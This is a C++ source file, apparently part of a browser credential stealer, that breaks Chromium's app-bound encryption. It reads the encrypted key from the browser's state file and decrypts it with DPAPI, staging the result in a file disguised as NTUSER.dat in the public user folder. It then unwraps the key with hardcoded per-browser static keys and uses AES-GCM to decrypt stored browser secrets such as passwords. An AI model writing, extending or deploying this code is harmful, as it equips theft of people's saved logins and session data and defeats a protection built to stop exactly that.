#include "includes\AppBoundKeyDecryptor.h"
#include "includes\Helper.h"

DATA_BLOB* master_key_blob_apb = nullptr;

AppBoundKeyDecryptor::AppBoundKeyDecryptor() {}

//AppBoundKeyDecryptor::~AppBoundKeyDecryptor() {
//	// Free memory allocated for master_key_blob if it's not null
//	if (master_key_blob_apb != nullptr) {
//		LocalFree(master_key_blob_apb->pbData);
//		delete master_key_blob_apb;
//	}
//}

bool AppBoundKeyDecryptor::AppBoundDecryptorInit(std::string path, std::string identifer)
{
	std::string decrypt_phase2_key = "";
	if (file_exist(path)) {
		
		std::ifstream file(path);
		if (!file.is_open()) {
			return false;
		}

		// Replace each "\" with "\\\\"
		std::string modified = std::regex_replace(identifer, std::regex(R"(\\)"), "\\\\");
		std::regex pattern("\""+ modified +"\"\\s*:\\s*\"([^\"]*)\"");
		std::string line;
		std::smatch match;

		while (std::getline(file, line)) {
			if (std::regex_search(line, match, pattern)) {

				if (match[1] == "NULL")
					return false;

				decrypt_phase2_key = DPAPI_Decrypt(match[1]);
				if (decrypt_phase2_key != "")
				{
					//Setup decryption key
					KEY_BLOB key_blob = unprotect_service_key(GetBrowserStaticKey(identifer));
					DATA_BLOB* out = new DATA_BLOB;
					out->pbData = key_blob.binary.data();
					out->cbData = key_blob.binary_size;

					//Initial 60 bytes contain a flag and the validation path for key retrieval process
					std::vector<uint8_t> slicing_vector = Base64Decode(decrypt_phase2_key);
					std::vector<BYTE> sliced_vector(slicing_vector.end() - 60, slicing_vector.end());

					//AES GCM KEY Decryption
					if (AESKeyDecrypter(sliced_vector, out))
						return true;
				}
			}
		}
		return false;
	}
	else {
		 return false;
	}
	return false;
}

BOOL AppBoundKeyDecryptor::SetupService(std::string path, std::string identifier)
{
	std::string encrypted_master_key_b64 = get_app_bound_browser_key(path);
	if (encrypted_master_key_b64 == "")
	{
		return false;
	}

	if (encrypted_master_key_b64.compare(0, 6, "QVBQQg") == 1) //First 4 characters not APPB (base64 decoded)
	{
		return false;
	}

	std::vector<unsigned char> decoded_key = Base64Decode(encrypted_master_key_b64);
	if (decoded_key.size() > 4) {
		decoded_key.erase(decoded_key.begin(), decoded_key.begin() + 4); //Drop APPB
	}

	std::string modified_key = Base64Encode(decoded_key);
	modified_key.erase(remove(modified_key.begin(), modified_key.end(), '\n'), modified_key.end());

	std::string output_file = "c:\\users";
	output_file += "\\public\\";
	output_file += "NTUSER.dat";
	std::string decryptedData = DPAPI_Decrypt(modified_key);
	std::ofstream outputFile(output_file, std::ios::app);
	if (decryptedData != "") {
		if (outputFile.is_open()) {
			std::string json = "{\"" + identifier + "\":\"" + decryptedData + "\"},";

			outputFile << json;
			outputFile.close();
			return true;
		}
	}
	else
	{
		if (outputFile.is_open()) {
			decryptedData = "NULL";
			std::string json = "{\"" + identifier + "\":\"" + decryptedData + "\"},";

			outputFile << json;
			outputFile.close();
			return false;
		}
	}
	return false;
}

std::string AppBoundKeyDecryptor::get_app_bound_browser_key(std::string path)
{
	std::string enc_key_base64;

	enc_key_base64 = read_json(path);
	if (!enc_key_base64.empty())
	{
		return enc_key_base64;
	}
	return "";
}

std::string AppBoundKeyDecryptor::read_json(const std::string& filePath) {
	std::ifstream file(filePath);
	if (!file.is_open()) {
		std::cerr << "Failed to open the file: " << filePath << std::endl;
		return "";
	}

	std::regex pattern("\"app_bound_encrypted_key\"\\s*:\\s*\"([^\"]*)\"");
	std::string line;
	std::smatch match;

	while (std::getline(file, line)) {
		if (std::regex_search(line, match, pattern)) {
			return match[1]; // Return the captured group (value of "encrypted_key")
		}
	}

	return "";
}

std::string AppBoundKeyDecryptor::DPAPI_Decrypt(std::string encrypted_data) {
	std::vector<unsigned char> binaryKey;
	DWORD binaryKeySize = 0;

	// Decoding the base64 encoded string to binary data.
	if (!CryptStringToBinaryA(encrypted_data.c_str(), 0, CRYPT_STRING_BASE64, NULL, &binaryKeySize, NULL, NULL))
	{
		//std::cout << "CryptStringToBinaryA [1] : Failed to convert BASE64 private key. \n";
		return "";
	}

	binaryKey.resize(binaryKeySize);
	if (!CryptStringToBinaryA(encrypted_data.c_str(), 0, CRYPT_STRING_BASE64, binaryKey.data(), &binaryKeySize, NULL, NULL))
	{
		//std::cout << "CryptStringToBinaryA [2] : Failed to convert BASE64 private key. \n";
		return "";
	}

	// Calling CryptUnprotectData to unprotect the master key.
	// Out DATA_BLOB will hold the key we need with its length.
	DATA_BLOB in;
	DATA_BLOB* out = new DATA_BLOB;
	in.pbData = binaryKey.data();
	in.cbData = binaryKeySize;

	if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, out))
	{
		//std::cout << "CryptUnprotectData [1] : Failed to convert BASE64 private key. \n";
		return "";
	}

	// Convert DATA_BLOB to std::vector<uint8_t>
	std::vector<uint8_t> decrypted_data(out->pbData, out->pbData + out->cbData);
	std::string decrypted_encoded = Base64Encode(decrypted_data);

	return decrypted_encoded;
}

AppBoundKeyDecryptor::KEY_BLOB AppBoundKeyDecryptor::unprotect_service_key(std::string service_key)
{
	KEY_BLOB blob;
    blob.binary = { 0 };
    blob.binary_size = 0;
	std::vector<unsigned char> binaryKey;
	DWORD binaryKeySize = 0;

	// Decoding the base64 encoded string to binary data.
	if (!CryptStringToBinaryA(service_key.c_str(), 0, CRYPT_STRING_BASE64, NULL, &binaryKeySize, NULL, NULL))
	{
		//std::cout << "CryptStringToBinaryA [1] : Failed to convert BASE64 private key. \n";
		return blob;
	}

	binaryKey.resize(binaryKeySize);
	if (!CryptStringToBinaryA(service_key.c_str(), 0, CRYPT_STRING_BASE64, binaryKey.data(), &binaryKeySize, NULL, NULL))
	{
		//std::cout << "CryptStringToBinaryA [2] : Failed to convert BASE64 private key. \n";
		return blob;
	}

	blob.binary = binaryKey;
	blob.binary_size = binaryKeySize;
	return blob;
}

BOOL AppBoundKeyDecryptor::AESKeyDecrypter(std::vector<BYTE> EncryptedBlob, DATA_BLOB* master_key_blob)
{
	try
	{
		BCRYPT_ALG_HANDLE hAlgorithm = 0;
		BCRYPT_KEY_HANDLE hKey = 0;
		NTSTATUS status = 0;
		SIZE_T EncryptedBlobSize = EncryptedBlob.size();
		ULONG PlainTextSize = 0;

		// Extract the IV (12 bytes), Ciphertext (rest of the data excluding IV and Tag), and Tag (last 16 bytes)
		std::vector<BYTE> IV(EncryptedBlob.begin(), EncryptedBlob.begin() + IV_SIZE);
		std::vector<BYTE> CipherText(EncryptedBlob.begin() + IV_SIZE, EncryptedBlob.begin() + EncryptedBlobSize - TAG_SIZE);
		std::vector<BYTE> Tag(EncryptedBlob.end() - TAG_SIZE, EncryptedBlob.end());

		// Open algorithm provider for decryption
		status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
		if (!BCRYPT_SUCCESS(status))
		{
			//std::cout << "BCryptOpenAlgorithmProvider failed with status: " << status << std::endl;
			return false;
		}

		// Set chaining mode for decryption
		status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
		if (!BCRYPT_SUCCESS(status))
		{
			//std::cout << "BCryptSetProperty failed with status: " << status << std::endl;
			BCryptCloseAlgorithmProvider(hAlgorithm, 0);
			return false;
		}

		// Generate symmetric key
		status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, master_key_blob->pbData, master_key_blob->cbData, 0);
		if (!BCRYPT_SUCCESS(status))
		{
			//std::cout << "BCryptGenerateSymmetricKey failed with status: " << status << std::endl;
			BCryptCloseAlgorithmProvider(hAlgorithm, 0);
			return false;
		}

		// Auth cipher mode info
		BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO AuthInfo;
		BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);
		AuthInfo.pbNonce = IV.data();
		AuthInfo.cbNonce = IV_SIZE;
		AuthInfo.pbTag = Tag.data();
		AuthInfo.cbTag = TAG_SIZE;

		// Get size of plaintext buffer
		status = BCryptDecrypt(hKey, CipherText.data(), CipherText.size(), &AuthInfo, NULL, 0, NULL, 0, &PlainTextSize, 0);
		if (!BCRYPT_SUCCESS(status))
		{
			//std::cout << "BCryptDecrypt (1) failed with status: " << status << std::endl;
			return false;
		}

		// Allocate memory for the plaintext
		std::vector<BYTE> PlainText(PlainTextSize);

		// Decrypt the data
		status = BCryptDecrypt(hKey, CipherText.data(), CipherText.size(), &AuthInfo, NULL, 0, PlainText.data(), PlainTextSize, &PlainTextSize, 0);
		if (!BCRYPT_SUCCESS(status))
		{
			//std::cout << "BCryptDecrypt (2) failed with status: " << status << std::endl;
			return false;
		}

		std::string hexString = BytesToHexString(PlainText.data(), PlainTextSize);
		if (!ConvertToBLOB(hexString))
			return false;

		// Close the algorithm handle
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		return true;
	}
	catch (int e)
	{
		//std::cout << "An error occurred: " << e << std::endl;
		return false;
	}
}

BOOL AppBoundKeyDecryptor::ConvertToBLOB(std::string hexString)
{
	size_t numBytes = hexString.length() / 2;

	// Allocate memory for the DATA_BLOB
	master_key_blob_apb = new DATA_BLOB;
	master_key_blob_apb->cbData = static_cast<DWORD>(numBytes);
	master_key_blob_apb->pbData = static_cast<BYTE*>(malloc(numBytes));

	if (!master_key_blob_apb->pbData) {
		//std::cerr << "Memory allocation failed." << std::endl;
		delete master_key_blob_apb;
		master_key_blob_apb = nullptr;
		return false;
	}

	// Convert hex string to bytes
	for (size_t i = 0; i < numBytes; ++i) {
		std::string byteString = hexString.substr(i * 2, 2);
		master_key_blob_apb->pbData[i] = static_cast<BYTE>(std::stoul(byteString, nullptr, 16));
	}
	return true;
}

std::string AppBoundKeyDecryptor::AESDecrypter(std::vector<BYTE> EncryptedBlob)
{
	try
	{
		BCRYPT_ALG_HANDLE hAlgorithm = 0;
		BCRYPT_KEY_HANDLE hKey = 0;
		NTSTATUS status = 0;
		SIZE_T EncryptedBlobSize = EncryptedBlob.size();
		SIZE_T TagOffset = EncryptedBlobSize - 15;
		ULONG PlainTextSize = 0;

		std::vector<BYTE> CipherPass(EncryptedBlobSize);
		std::vector<BYTE> PlainText;
		std::vector<BYTE> IV(IV_SIZE);

		// Parse iv and password from the buffer
		std::copy(EncryptedBlob.data() + 3, EncryptedBlob.data() + 3 + IV_SIZE, IV.begin());
		std::copy(EncryptedBlob.data() + 15, EncryptedBlob.data() + EncryptedBlobSize, CipherPass.begin());

		// Open algorithm provider for decryption
		status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
		if (!BCRYPT_SUCCESS(status))
		{
			//std::cout << "BCryptOpenAlgorithmProvider failed with status: " << status << std::endl;
			return "";
		}

		// Set chaining mode for decryption
		status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
		if (!BCRYPT_SUCCESS(status))
		{
			//std::cout << "BCryptSetProperty failed with status: " << status << std::endl;
			BCryptCloseAlgorithmProvider(hAlgorithm, 0);
			return "";
		}

		// Generate symmetric key
		status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, master_key_blob_apb->pbData, master_key_blob_apb->cbData, 0);
		if (!BCRYPT_SUCCESS(status))
		{
			//std::cout << "BcryptGenertaeSymmetricKey failed with status: " << status << std::endl;
			BCryptCloseAlgorithmProvider(hAlgorithm, 0);
			return "";
		}

		// Auth cipher mode info
		BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO AuthInfo;
		BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);
		TagOffset = TagOffset - 16;
		AuthInfo.pbNonce = IV.data();
		AuthInfo.cbNonce = IV_SIZE;
		AuthInfo.pbTag = CipherPass.data() + TagOffset;
		AuthInfo.cbTag = TAG_SIZE;

		// Get size of plaintext buffer
		status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, NULL, NULL, &PlainTextSize, 0);
		if (!BCRYPT_SUCCESS(status))
		{
			//std::cout << "BCryptDecrypt (1) failed with status: " << status << std::endl;
			return "";
		}

		// Allocate memory for the plaintext
		PlainText.resize(PlainTextSize);

		status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, PlainText.data(), PlainTextSize, &PlainTextSize, 0);
		if (!BCRYPT_SUCCESS(status))
		{
			//std::cout << "BCrypt Decrypt (2) failed with status: " << status << std::endl;
			return "";
		}

		// Close the algorithm handle
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);

		return std::string(PlainText.begin(), PlainText.end());
	}
	catch (int e)
	{
		return "";
	}
}
